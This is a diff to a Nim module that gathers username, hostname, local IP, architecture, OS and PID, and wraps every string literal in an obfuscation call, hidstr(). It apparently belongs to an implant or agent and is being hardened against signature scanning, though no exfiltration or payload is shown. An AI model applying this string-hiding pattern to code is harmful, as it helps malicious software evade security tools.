@@ -1,62 +1,63 @@
 import std/[os, net, strutils, osproc]
+import crypto/strenc
 
 proc getUsername*(): string =
-  result = getEnv("USER", getEnv("LOGNAME", ""))
+  result = getEnv(hidstr("USER"), getEnv(hidstr("LOGNAME"), ""))
   if result.len == 0:
     when defined(windows):
-      result = getEnv("USERNAME", "unknown")
+      result = getEnv(hidstr("USERNAME"), hidstr("unknown"))
     else:
       try:
-        let (output, code) = execCmdEx("id -un")
+        let (output, code) = execCmdEx(hidstr("id -un"))
         if code == 0:
           result = output.strip()
         else:
-          result = "unknown"
+          result = hidstr("unknown")
       except:
-        result = "unknown"
+        result = hidstr("unknown")
 
 proc getHostname*(): string =
   try:
-    let (output, code) = execCmdEx("hostname")
+    let (output, code) = execCmdEx(hidstr("hostname"))
     if code == 0:
       result = output.strip()
     else:
-      result = "unknown"
+      result = hidstr("unknown")
   except:
-    result = "unknown"
+    result = hidstr("unknown")
 
 proc getLocalIP*(): string =
   try:
     var sock = newSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
-    sock.connect("8.8.8.8", Port(53))
+    sock.connect(hidstr("8.8.8.8"), Port(53))
     result = sock.getLocalAddr()[0]
     sock.close()
   except:
-    result = "127.0.0.1"
+    result = hidstr("127.0.0.1")
 
 proc getArch*(): string =
   when defined(amd64):
-    result = "x86_64"
+    result = hidstr("x86_64")
   elif defined(arm64):
-    result = "aarch64"
+    result = hidstr("aarch64")
   elif defined(i386):
-    result = "x86"
+    result = hidstr("x86")
   else:
-    result = "unknown"
+    result = hidstr("unknown")
 
 proc getOS*(): string =
   when defined(linux):
-    result = "Linux"
+    result = hidstr("Linux")
   elif defined(windows):
-    result = "Windows"
+    result = hidstr("Windows")
   elif defined(macosx):
-    result = "macOS"
+    result = hidstr("macOS")
   else:
-    result = "Unknown"
+    result = hidstr("Unknown")
 
 proc getPid*(): int =
   result = getCurrentProcessId()
 
 proc debugLog*(msg: string) =
   when defined(debug):
-    stderr.writeLine("[DBG] " & msg)
+    stderr.writeLine(hidstr("[DBG] ") & msg)
